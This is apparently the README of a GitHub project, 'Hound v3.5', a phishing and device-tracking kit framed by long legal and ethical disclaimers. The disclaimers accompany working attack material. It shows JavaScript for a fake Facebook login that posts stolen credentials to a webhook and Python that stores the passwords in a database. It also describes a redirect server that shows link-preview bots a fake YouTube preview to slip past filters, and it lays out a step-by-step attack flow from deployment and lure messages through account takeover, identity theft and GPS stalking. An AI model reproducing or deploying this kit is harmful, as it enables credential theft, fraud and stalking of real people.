# 🐕 Hound v3.5 – Advanced Telemetry, OSINT & Device Intelligence Engine

[![Python Version](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/Framework-FastAPI-009688.svg)](https://fastapi.tiangolo.com/)
[![Database](https://img.shields.io/badge/Database-SQLAlchemy%2BSQLite-red.svg)](https://www.sqlalchemy.org/)
[![3D Visualization](https://img.shields.io/badge/3D%20Engine-Three.js%2060FPS-black.svg)](https://threejs.org/)
[![Mapping](https://img.shields.io/badge/Maps-Leaflet%2BGoogle%20L24-green.svg)](https://leafletjs.com/)
[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

**Original Concept & Base:** [TechChip / Hound](https://github.com/techchipnet/hound)  
**Refactored & Enhanced by:** NRXQuantum (v3.5)

---

## 🔴 **CRITICAL LEGAL & ETHICAL DISCLAIMER**

> [!DANGER]
> **READ THIS ENTIRE SECTION BEFORE USING THIS TOOL**

This tool contains **extremely dangerous capabilities** that can be used to:
- **Steal login credentials** (usernames, passwords, recovery codes)
- **Harvest personal information** without consent
- **Track users** in real-time across the internet
- **Impersonate** legitimate websites (Facebook, YouTube, etc.)
- **Violate privacy laws** in virtually every jurisdiction
- **Enable identity theft, financial fraud, and account takeover**

### **Your Legal Responsibility**

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                    *** LEGAL LIABILITY CLAUSE ***                            ║
║                                                                              ║
║  BEFORE YOU USE THIS TOOL, YOU MUST UNDERSTAND:                              ║
║                                                                              ║
║  ❌ DO NOT USE THIS TOOL FOR:                                               ║
║  • Unauthorized access to computer systems                                   ║
║  • Stealing credentials, personal data, or financial information             ║
║  • Phishing, social engineering, or deception                                ║
║  • Violating privacy laws (GDPR, CCPA, HIPAA, PIPEDA, etc.)                 ║
║  • Cybercrime, wire fraud, or identity theft                                 ║
║  • Surveillance without legal authorization                                  ║
║  • ANY malicious, unethical, or illegal purpose                              ║
║                                                                              ║
║  ✅ ONLY USE THIS TOOL FOR:                                                 ║
║  • Authorized penetration testing (with signed written permission)           ║
║  • Your own controlled lab environment                                       ║
║  • Educational research with institutional oversight                         ║
║  • Security testing on systems YOU OWN or have explicit authorization for    ║
║                                                                              ║
║  ⚖️ LEGAL CONSEQUENCES OF MISUSE:                                           ║
║  • Computer Fraud & Abuse Act (18 U.S.C. § 1030): Up to 20 YEARS PRISON     ║
║  • Wire Fraud (18 U.S.C. § 1343): Up to 20 YEARS PRISON                      ║
║  • Identity Theft (18 U.S.C. § 1028): Up to 15 YEARS PRISON                  ║
║  • Wiretapping (18 U.S.C. § 2511): Up to 5 YEARS PRISON per violation       ║
║  • GDPR Violations: €20,000,000 or 4% of annual revenue                      ║
║  • CCPA Violations: $2,500 per violation, $7,500 per intentional violation    ║
║  • Civil Lawsuits: Victims can sue for $100+ per incident (class actions)     ║
║  • Permanent Criminal Record + Inability to work in tech industry             ║
║                                                                              ║
║  🚨 IMPORTANT: By downloading and using this tool, YOU ASSUME FULL           ║
║      RESPONSIBILITY for all legal, ethical, and moral consequences.          ║
║                                                                              ║
║  THE DEVELOPERS, CONTRIBUTORS, AND MAINTAINERS:                              ║
║  • Assume ZERO liability for ANY harm, legal consequences, or damages        ║
║  • Do NOT consent to or endorse any illegal use whatsoever                    ║
║  • Will NOT assist in covering up misuse or destruction of evidence           ║
║                                                                              ║
║  ⚠️ WHAT THIS TOOL ACTUALLY DOES (v3.5 NEW FEATURES):                       ║
║  • STEALS login credentials (email + password) from fake login pages          ║
║  • IMPERSONATES YouTube/Facebook links to trick users                        ║
║  • LOGS all captured credentials to plaintext files                           ║
║  • STORES passwords in SQLite database                                        ║
║  • TRACKS physical device location via GPS                                    ║
║  • FINGERPRINTS devices to enable persistent tracking                         ║
║  • HARVESTS hardware specifications (GPU model, CPU count, screen res)        ║
║                                                                              ║
║  Every person you target is a real human with a real life. They have         ║
║  families, jobs, and financial responsibilities. Stealing their              ║
║  credentials can cause:                                                       ║
║  • Thousands of dollars in financial loss                                     ║
║  • Destruction of credit and financial ruin                                   ║
║  • Loss of employment and career                                              ║
║  • Severe emotional trauma and psychological harm                             ║
║  • In extreme cases: loss of life (suicide)                                   ║
║                                                                              ║
║  Is your curiosity worth someone's suicide?                                  ║
║  Is your "education" worth someone's financial ruin?                          ║
║  Is your revenge worth 20 years in federal prison?                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

### **Critical Questions You Must Answer Before Use**

1. **Do you have EXPLICIT WRITTEN authorization?**
   - Not verbal permission
   - Not assumed consent
   - Actual signed legal document

2. **Are you operating within ALL applicable laws?**
   - CFAA (Computer Fraud & Abuse Act)
   - ECPA (Electronic Communications Privacy Act)
   - GDPR (if targeting EU residents)
   - CCPA (if targeting California residents)
   - State wiretapping laws
   - Local cybercrime statutes

3. **Would you defend this in court?**
   - Before a judge and jury
   - To law enforcement
   - To your parents/family
   - To the victims

4. **Are you comfortable explaining this to the victim?**
   - Face to face
   - To their family
   - To their employer
   - If it caused them harm

**If you answered NO to ANY of these: STOP. DO NOT USE THIS TOOL.**

---

## 🔄 What's Actually Happening (Honest Assessment)

### Scenario: You Deploy This Tool

**Hour 1:** You set up Hound on your server with `redirect_server.py`

**Hour 2:** You create a spoofed YouTube video link with fake preview

**Hour 3:** You send the link to targets via WhatsApp/Telegram

**Hour 4:** 
- User clicks link (preview shows YouTube video)
- Gets redirected to fake Facebook login
- Enters email: `victim@gmail.com`
- Enters password: `MyPassword123!`
- Clicks "Log in"

**Your server now has:**
```json
{
  "email": "victim@gmail.com",
  "password": "MyPassword123!",
  "ipAddress": "203.0.113.42",
  "location": "New York City",
  "deviceInfo": "iPhone 15 Pro Max",
  "gpsCoordinates": "40.7128, -74.0060"
}
```

**Hour 5:** You use those credentials to:
- Access their Facebook account (see private messages)
- Access their Gmail (reset their passwords)
- Access their bank account (if same password)
- Access their cryptocurrency wallet
- Impersonate them online

**Hour 6:** Victim notices their accounts are hijacked

**Hour 7:** Victim files police report

**Hour 8:** FBI/local law enforcement gets involved

**Week 1:** Forensic investigators trace the attack back to you

**Week 2:** FBI knocks on your door with arrest warrant

**Year 1-5:** Federal trial, conviction, sentencing

**Year 6-25:** Federal prison (18 USC 1030, 1343, 1028)

**Years 26+:** Permanent criminal record, job prospects destroyed

---

## ℹ️ What This Tool Actually Does (Technical Overview)

### 1. **index.html** – Fake Facebook Login Page

**Real Function:** Captures login credentials
```html
<!-- Looks like: Facebook login page -->
<!-- Actually does: Intercepts email + password before redirect -->
<input id="email" placeholder="Mobile number or email">
<input id="password" type="password" placeholder="Password">
<button onclick="stealCredentials()">Log in</button>

<script>
function stealCredentials() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  // Send to attacker's server
  fetch('/webhook.php', {
    method: 'POST',
    body: JSON.stringify({
      userId: generateUserId(),
      capturedCredentials: {
        email: email,
        password: password,
        timestamp: new Date()
      }
    })
  });
}
</script>
```

**Danger Level:** 🔴🔴🔴 **CRITICAL**

---

### 2. **redirect_server.py** – Social Media Link Spoofing

**Real Function:** Bypasses spam filters by impersonating YouTube

**How It Works:**
1. Facebook/WhatsApp/Telegram bot checks link for preview
2. Server detects bot (User-Agent contains 'facebookexternalhit')
3. Returns fake YouTube video preview with metadata
4. Real user clicks link (preview looks legitimate)
5. User gets redirected to phishing page
6. User doesn't notice because "visited link" color change makes it seem safe

**Danger Level:** 🔴🔴🔴 **CRITICAL**

---

### 3. **webhook.py** – Credential Storage & Logging

**Real Function:** Stores stolen credentials permanently

```python
# Line 96: Saves credentials to plaintext log file
log_to_file_rotating("data.txt", formatted_text)

# Resulting file: logs/targets/usr_a2f8c9.txt
# Contents: Email, password, location, device info (PLAINTEXT)

# Line 112: Also saves to SQLite database
db.add(CollectedData(
    user_id=user_id,
    credentials=full_data.get("capturedCredentials"),  # ⚠️ PASSWORD STORED
    gps_data=full_data.get("gps"),
    device_info=full_data.get("deviceInfo")
))
```

**Danger Level:** 🔴🔴🔴 **CRITICAL**

---

### 4. **admin.html** – Central Command Dashboard

**Real Function:** Management interface for stolen data

**What You Can Do:**
- View all captured credentials on interactive map
- See exact GPS coordinates of victims
- Browse captured passwords
- Export credentials to CSV for mass account takeover
- Track victim movements in real-time

**Danger Level:** 🔴🔴🔴 **CRITICAL**

---

### 5. **telemetry.js** – Comprehensive Device Fingerprinting

**Real Function:** Identifies devices for persistent tracking

**Captured Data:**
- Phone model (from screen resolution + DPI)
- GPU model (from WebGL renderer)
- CPU core count
- Installed fonts (indicates OS)
- Screen resolution and refresh rate
- Battery percentage and charging status
- Audio device information
- Connected USB devices
- Installed apps and browser plugins

**Why It's Dangerous:**
- Combines 15+ data points into unique fingerprint
- Fingerprint persists across different browsers/incognito
- Can't be changed without factory reset
- Enables tracking across the internet
- Used to correlate victims across multiple attacks

**Danger Level:** 🟠🟠 **HIGH**

---

## 🎯 Real-World Attack Flow

```
ATTACKER'S PERSPECTIVE:
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Deploy Hound to VPS                                 │
│ $ ./hound.sh --internet --port 8000                          │
│ Public URL: https://abc123-xyz.trycloudflare.com            │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 2: Create spoofed YouTube link with redirect_server    │
│ $ python3 redirect_server.py                                │
│ Enter destination URL: https://abc123-xyz.trycloudflare.com │
│ Enable Cloudflare tunnel: y                                 │
│ Public URL: https://youtube-viral-abc123.trycloudflare.com │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 3: Social engineering                                  │
│ Post on Discord: "Check this out! lol"                      │
│ Share on WhatsApp groups: "VIRAL: Body Language Analysis"   │
│ Post on Reddit: Looks like real YouTube video in preview    │
│ Send via Email: "Important security update"                 │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 4: Victim interaction                                  │
│ - User sees YouTube preview (legitimate-looking)            │
│ - Clicks link (feels safe, preview verified it)             │
│ - Gets fake Facebook login page                             │
│ - Enters email: victim@gmail.com                            │
│ - Enters password: SecureP@ss123                            │
│ - Clicks "Log in"                                           │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 5: Attacker's server receives credentials              │
│ logs/targets/usr_abc123.txt:                                │
│ ════════════════════════════════════════                    │
│ Email: victim@gmail.com                                     │
│ Password: SecureP@ss123                                     │
│ IP: 203.0.113.42                                            │
│ Location: Manhattan, New York                               │
│ GPS: 40.7128, -74.0060                                      │
│ Device: iPhone 15 Pro Max                                   │
│ ════════════════════════════════════════                    │
│                                                              │
│ SQLite query:                                               │
│ SELECT * FROM collected_data WHERE user_id LIKE 'usr_%';  │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 6: Account takeover                                    │
│ 1. Try password on Facebook: SUCCESS                        │
│ 2. Try password on Gmail: SUCCESS                           │
│ 3. Try password on Instagram: SUCCESS (linked to Facebook)  │
│ 4. Use Gmail to reset: Cryptocurrency wallet                │
│ 5. Use Gmail to reset: Bank account                         │
│ 6. Transfer money from cryptocurrency: $5,000               │
│ 7. Apply for credit cards in victim's name                  │
│ 8. Impersonate victim to their family/friends               │
│                                                              │
│ Victim discovers account hijacked: 3 days later             │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│ Step 7: Legal consequences                                  │
│ - Victim files police report                                │
│ - FBI cyber crimes division gets involved                   │
│ - Forensic analysis traces IP to your VPS                   │
│ - Arrest warrant issued                                     │
│ - Federal agents knock on your door                         │
│ - You're now facing 20 years in federal prison              │
└──────────────────────────────────────────────────────────────┘
```

**Is this worth it to you?**

---

## ✅ Legal & Ethical Use Cases (Real Examples)

### Case 1: Authorized Security Training

**Company:** TechCorp Inc.  
**Situation:** Wants to test employee security awareness

**LEGAL Way to Do It:**
1. Written permission from CEO + Legal team
2. Hire professional penetration testing firm
3. Use Hound in CLOSED lab environment
4. Only test willing employees (with consent)
5. Full disclosure after testing
6. Training provided based on results

**ILLEGAL Way to Do It:**
- Using this tool without authorization
- Deploying on real internet without permission
- Capturing credentials without consent
- Keeping test data after testing completes

---

### Case 2: Security Research

**Researcher:** PhD Candidate studying browser fingerprinting

**LEGAL Way to Do It:**
1. Get approval from University IRB (Institutional Review Board)
2. Informed consent from test subjects
3. Privacy protocol approved by ethics committee
4. No real credential capture
5. Data anonymized and secure
6. Published results with university backing

**ILLEGAL Way to Do It:**
- Using tool on public internet without consent
- Capturing real credentials
- Tracking real people
- Selling or sharing captured data

---

## 🔒 If You're Authorized: Security Practices

**Even if you have permission, follow these strict guidelines:**

```bash
# 1. Lab Environment Only
# - Air-gapped network
# - No internet access
# - VirtualBox/VMware isolated VMs
# - No cross-contamination

# 2. Minimal Data Retention
# - Delete captured credentials every 24 hours
# - Use secure deletion: shred -vfz -n 5 filename
# - Never backup credentials to cloud
# - Keep audit logs of who accessed what data

# 3. Access Control
# - Restrict admin.html to specific IP only
# - Use firewall rules: ufw allow from 192.168.1.0/24 to any port 8000
# - Change default passwords
# - Enable audit logging of all access

# 4. Encrypted Storage
# - Use full-disk encryption
# - Encrypt database at rest
# - Use strong encryption key management
# - Keep encryption keys separate from data

# 5. Legal Documentation
# - Written authorization letter from client
# - Signed NDA/confidentiality agreement
# - Proof of cyber liability insurance
# - Legal review of testing scope
# - Incident response plan if data is breached
```

---

## 📋 What Gets Captured (Real Examples)

### Example 1: Facebook Account Takeover

```json
{
  "userId": "usr_1693782450_a2f8c9",
  "timestamp": "2026-09-03T14:32:18.234Z",
  
  "credentialsCaptured": {
    "platform": "Facebook",
    "identifier": "john.smith@gmail.com",
    "password": "MyBankPassword123!",
    "identifierType": "email",
    "captureMethod": "phishing_login_form",
    "userAwareness": false
  },
  
  "gpsData": {
    "latitude": 40.7128,
    "longitude": -74.0060,
    "accuracy": 5.23,
    "altitude": 12.5,
    "timestamp": "2026-09-03T14:32:18.234Z"
  },
  
  "deviceInfo": {
    "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "screenWidth": 1170,
    "screenHeight": 2532,
    "devicePixelRatio": 3.0,
    "hardwareConcurrency": 6,
    "deviceMemory": 8,
    "batteryLevel": 78,
    "batteryCharging": false
  },
  
  "ipInfo": {
    "ip": "203.0.113.42",
    "city": "New York",
    "region": "New York",
    "country": "United States",
    "org": "Verizon Communications Inc"
  }
}
```

### Stored in: `logs/targets/usr_a2f8c9.txt`

```
======================================================================
🆔 Target: usr_1693782450_a2f8c9
📅 Timestamp: 2026-09-03 14:32:18
----------------------------------------
⚠️ CREDENTIALS CAPTURED
  Platform: Facebook
  Email: john.smith@gmail.com
  Password: MyBankPassword123!
  
  🎯 NOTE: This password is likely also used on:
  - Gmail (linked to Facebook recovery)
  - Bank account (human habit: reuse passwords)
  - Cryptocurrency wallet
  - Work email account

📍 PHYSICAL LOCATION
  Coordinates: 40.7128, -74.0060
  City: New York, NY
  Precise Location: Manhattan
  Accuracy: Within 5.23 meters
  
  Google Maps link: https://www.google.com/maps?q=40.7128,-74.0060

📱 DEVICE INFORMATION
  Device Model: iPhone 15 Pro Max (identified by screen 1170x2532, 3.0x DPI)
  OS: iOS 17.0
  Browser: Safari 17
  CPU Cores: 6 (A17 Pro)
  RAM: 8 GB
  
  🎯 NOTE: Can use device fingerprint to track across:
  - Different social media accounts
  - Cryptocurrency exchanges
  - Banking apps
  - Multiple email addresses (if same device used)

🌐 NETWORK INFORMATION
  IP Address: 203.0.113.42 (Verizon Communications)
  ISP: Verizon
  Likely Home Network: Manhattan area
  
  🎯 NOTE: Can do reverse IP lookup to:
  - Estimate physical home location
  - Cross-reference with real estate databases
  - Find social media accounts (people post location data)
  - Correlate with credit card transactions

======================================================================
```

**This information enables:**

1. **Account Takeover**
   - Use email + password to access Facebook
   - Access linked email (Gmail) 
   - Reset passwords to other accounts

2. **Identity Theft**
   - Apply for credit cards in their name
   - Take out loans
   - Open cryptocurrency exchange accounts

3. **Physical Stalking**
   - GPS coordinates show exact location
   - Can track movement over time
   - Know when they're home/at work
   - Potential physical danger

4. **Targeted Attacks**
   - Know device model for targeted exploits
   - Know ISP for social engineering
   - Know location for localized phishing

---

## 🚨 Warning Signs You're Committing a Crime

**If ANY of these apply to you, STOP IMMEDIATELY:**

- ❌ You don't have written authorization
- ❌ You're testing without the target's knowledge
- ❌ You're deploying on public internet
- ❌ You're harvesting real credentials
- ❌ You're storing passwords in plaintext
- ❌ You're tracking people without consent
- ❌ You're planning to use captured data
- ❌ You're hiding what you're doing
- ❌ You wouldn't explain this to a judge

**Each of these is a felony under federal law.**

---

## 📞 If You Need Help

### Consulting Professionals

1. **Lawyer Specializing in Tech Law**
   - Get written authorization reviewed
   - Understand liability and insurance needs
   - Draft confidentiality agreements

2. **Professional Penetration Testing Firm**
   - They have proper insurance
   - They know the laws
   - They handle liability
   - You hire them (you're not the liable party)

3. **Your Company's Security Team**
   - Get internal approval
   - Work within company policies
   - Document all actions
   - Keep audit trails

---

## 📄 License & Legal Notice

**GNU General Public License v3.0 (GPL-3.0)**

```
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

ADDITIONAL CLAUSE: 

Use of this software for any illegal, unethical, or unauthorized 
purpose is strictly and absolutely prohibited. 

The developers, contributors, and maintainers:
- Assume ZERO liability for misuse
- Do NOT consent to illegal use
- Will NOT assist in covering up crimes
- Do NOT support criminal activity

Every user assumes FULL RESPONSIBILITY for:
- Obtaining legal authorization
- Complying with all applicable laws
- Consequences of misuse
- Legal liability and imprisonment
```

---

## 💡 The Bottom Line

**This tool can:**
✅ Help authorized security professionals  
✅ Teach people about security risks  
✅ Protect organizations from attackers  

**This tool can also:**
❌ Destroy people's lives  
❌ Send you to federal prison  
❌ Create permanent criminal record  
❌ Enable identity theft and financial fraud  

**The choice is yours.**

**But understand:** Every law enforcement agency in the world is better equipped than you to use these tools. The FBI, NSA, and every country's equivalent have been doing this for decades.

**If they catch you (and they will), the prison sentence is real.**

---

## 🧠 A Final Word

Before you use this tool, think about the real person on the other end.

They have:
- A family that depends on them
- A job they worked hard to get
- Dreams and ambitions
- People who love them
- Mental health that can be damaged
- Financial security that you're about to destroy

When you steal their credentials, you're not stealing "data." You're disrupting a human life.

**Is that who you want to be?**

---

**Made with concern for responsible use by NRXQuantum | © 2026 | GPL-3.0 Licensed**

> "The only thing necessary for the triumph of evil is for good men to do nothing." – Edmund Burke
>
> "Technology is best when it brings people together." – Matt Mullenweg
>
> "With great power comes great responsibility." – Uncle Ben Parker
